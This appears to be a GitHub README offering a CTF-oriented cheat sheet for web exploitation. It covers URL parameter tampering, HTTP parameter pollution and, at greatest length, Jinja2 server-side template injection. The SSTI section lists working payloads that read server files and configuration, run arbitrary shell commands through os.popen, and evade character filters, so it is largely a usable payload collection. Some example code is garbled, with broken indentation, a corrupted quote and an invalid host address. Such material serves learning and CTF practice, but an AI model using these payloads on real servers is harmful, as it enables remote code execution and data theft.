# Tricks in web exploit
[![Open Source Love](https://firstcontributions.github.io/open-source-badges/badges/open-source-v1/open-source.svg)](https://github.com/firstcontributions/open-source-badges)
[![License](https://camo.githubusercontent.com/fd551ba4b042d89480347a0e74e31af63b356b2cac1116c7b80038f41b04a581/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4d49542d677265656e2e737667)](https://opensource.org/licenses/MIT)

This repository aims to simplify and help to make payload for web exploiting easier, most situations are based on CTFs. If you are looking for some tricky methods, hope you enjoy !!

---
## Table of contents
- [URL](#URL)
  - [Some filter url](#Some-filter-url)
  - [Http parameter polution](#Http-parameter-pollution)
    - [Server-Side HPP](#Server-Side-HPP)
    - [Client-Side HPP](#Client-Side-HPP)
- [Technique](#Technique)
- [Snipets](#Snipets)
- [Cheat Sheet](#Cheat-sheet)
  - [SSTI](#SSTI)
    - [Jinja2](#Jinja2)
  - [SQL Injection](#SQL-Injection)
- [Reference source](#Reference-source)

---
### URL
#### What is URL?

A uniform resource locator, or URL, is a short string containing an address which refers to an object in the "web." URLs are a subset of URIs. Moreover, it can be used for GET request with modify parameter, see more [here](https://support.google.com/google-ads/answer/6277564?hl=en). In fact, some specific characters are ***encoded***, there is rules you can find query [here](http://www.cheat-sheets.org/sites/html.su/urlencoding.html).

So let's talk into main part, here the sample querry:
`https://example.com/?querry=test&querry2=test2` that you can send value `querry` with `test`. So how can you exploit? Just modify parameter whatever you like to get information which bases on your code.
```
<?php
    if($_GET['get']=="abc") echo ("Hacked");
    else echo("Wrong");
?>
```
Here is sample php code, the aim of this is print `Hacked` when `$_GET['get']=="abc"`, GET method can be found [here](https://www.php.net/manual/en/reserved.variables.get.php), so the solution is `https://example.com/?get=abc`. Other parameters come with code:

Ex1
```
<?php
    if($_GET['ip']==$_SERVER['REMOTE_ADDR']) echo ("Hacked");
    else echo("Wrong");
?>
```
Solution: `https://example.com/?ip=<your-ipv4>` you can find your ip [here](https://whatismyipaddress.com/).

Ex2:
```
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response
app = Flask(__name__)

@app.route('/')

def index():

    return Response(open(__file__).read(), mimetype='text/plain' )

@app.route('/ssti')
    def ssti():

    query = request.args['query'] if â€˜query' in request.args else '...

    if len(query) > 48:
        return "Too long!"
        return render_template_string(query)

app.run('@.0.0.0', 1337)
```
It is quite complex, you must find the variable can be exploited, `query = request.args['query']` so `query` can be used for parameter, but look `request.args['query']` is same method GET but it must come with name of its function so the solution is `https://example.com/?ssti/query=<your-payload>`.

#### Http parameter pollution
The previous part show you how can send value with changing url parameter so what will happen when you send multiple same value like `https://example.com/?color=red&color=blue`? The result will be red or blue or both of them. It depend on your language used and type of server. For example:
- if your server use `JSP` with `Tomcat` server, result is red - first value;
- `PHP` with `Apache`, result is blue - second one;
- `ASP` with `IIS`, reusult will be both of them.

Because requests become messy so that we can inject malicious code to: alter behavior of website, exploit, bypass WAF, change input value, etc. There are 2 methods to use this: Server-Side and Client-Side.

##### Server-Side HPP
When you send request to server, not only server return text on website but also it may return some result of code. Here is example: `https://www.example.com/transfer?from=123&to=456&amount=5000` - the aim of this url is transfer money from alice to bob, so lets mess order of parameter `https://www.example.com/transfer?from=123&to=456&amount=5000&from=789`.

Here is code inside server:
```
        user.account = 123
        
        def prepare_transfer(params)
            params << user.account
            transfer_money(params) #user.account (123) is params[2]
            end
        
        def transfer_money(params)
            to = params[0]
            amount = params[1]
            from = params[2]
            transfer(to,amount,from)
            end
```
So how it works? `prepare_transfer` get 1 array called `params` including parameter `to` and `amount` from url, the array will be [456, 5000]. The first line `user.account = 123` will push back value into array [456, 5000, 123] then `params` move to `transfer_money`. The order of array is `to account` -> `amount money` -> `from account`, lets change order of parameter, `https://www.bank.com/transfer?to=456&amount=5000&from=789`: the array is [456, 5000, 789, 123], follow order of array, the money for 789 will send to 456. 

##### Client-Side HPP
Here is url: `http://host/page.php?par=123%26action=edit`
and code inside:
```
 <? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?>
   <a href="/page.php?action=view&par='.<?=$val?>.'">View Me!</a>
```
 
---
### SSTI
#### What is ssti?
It means server-side template injection, occurs when an attacker is able to use native template syntax to inject a malicious payload into a template. Find more [here](https://portswigger.net/web-security/server-side-template-injection)

---
#### Jinja2
It is template engine of Flask framework (Python), you can find more [here](https://flask.palletsprojects.com/en/2.1.x/templating/)

Some popular payload:
- Test ssti is working or not:`{{7*7}}` or `{{7*'7'}}` 
- Read config file of server`{{config.items()}}` or `{{config}}` or {% print config %}
- Open file at path `<path/of/file>`:
  - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('<path/of/file>').read() }}`
  - `{{get_flashed_messages.__globals__.__builtins__.open("<path/of/file>").read()}}` 
  - `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("<path/of/file>").read() }}`
- Open file `flag` (using filter pass below):
  - `{{lipsum.__globals__.__getitem__(dict(os=x)|first).popen((dict(cat=x)|first)+(dict(fl=x)|first|indent((dict(bla=x)|first)|length,true))+(dict(ag=x)|first)).read()}}`
  - `{{lipsum.__globals__[dict(__buil=anh,tins__=to)|join][dict(op=pro,en=wa)|join](dict(fl=a,ag=b)|join).read()}}`
  - `{{url_for.__globals__.os.popen((((dict(c=x,a=x,t=x)|list)|join)|center)+(dict(fl=x,ag=x)|list)|join).read()}}`
  - `{{get_flashed_messages.__globals__.__builtins__.open([].__doc__[-[[],[],[],[],[]].__len__()]+().__doc__[[[],[],[]].__len__()]+().__add__.__name__[[[],[]].__len__()]+().__gt__.__name__[[[],[]].__len__()]).read()}}`
- Execute `<cmd>`:
  - `{{lipsum.__globals__.os.popen('<cmd>').read()}}`
  - `{{cycler.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{joiner.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{namespace.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('<cmd>').read()}}`
  - `{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('<cmd>').read()}}`
- Update config:
  - `{% set x=config.update(l=lipsum) %}`


Some popular filter:
- `{{ }}`: or some similar synstax (open synstax), you can use other methods such as `{% %}`
- `[a-Z]`: include some specific letter like: `flag`, `cat`, etc. You can change with magic python mechanism. 
  - `a`: `().__add__.__name__[2]` or `().__add__.__name__[-5]`
  - `d`: `().__add__.__name__[-3]`
  - `f`: `[].__doc__[-5]`
  - `g`: `().__gt__.__name__[2]` or `().__gt__.__name__[-4]
`
  - `l`: `().__doc__[3]` or `().__add__.__name__[3]`
  - `i`: `().__doc__[2]`
  - `j`: `().__doc__[5]`
  - `t`: `().__gt__.__name__[3]` or `().__gt__.__name__[-3]`
  - `u`: `().__doc__[1]`
  - `os`: `dict(os=x)|first`

- `[0-9]`: include decimal numbers, if you face with problems having above filter, free for combining them.
  - `0`: `[].__len__()`
  - `1`: `[[]].__len__()`
  - `2`: `[[],[]].__len__()`
  - `3`: `[[],[],[]].__len__()`
  - `4`: `[[],[],[],[]].__len__()`
  - `5`: `[[],[],[],[],[]].__len__()`
  - `6`: `[[],[],[],[],[],[]].__len__()`
  - `7`: `[[],[],[],[],[],[],[]].__len__()`
  - `8`: `[[],[],[],[],[],[],[],[]].__len__()`
  - `9`: `[[],[],[],[],[],[],[],[],[]].__len__()`
- `'`: use `dict()` instead   
- ` `: blank or space, use `indent()`
- `_`: there are 2 methods:
  - Using hex encoder: %5F
  - Moving string over `request.args`: `{% set x = config.update(g=request.args.a) %}`, then send request `payload=<payload>&a=__globals__`
- Others can be found [here](https://tedboy.github.io/jinja2/templ14.html)

## SQL Injection
### How SQL work

---

## Reference source
- [My markdown](https://hackmd.io/@Trumpiter/basicvulnweb) about CTFs challenges written in Vietnamese
- [Synthetic documents](https://github.com/c4tbu1/Learning-Resources) from [`c4tbu1`](https://github.com/c4tbu1)
---
###### tags: `CTFs` `Web Exploit`
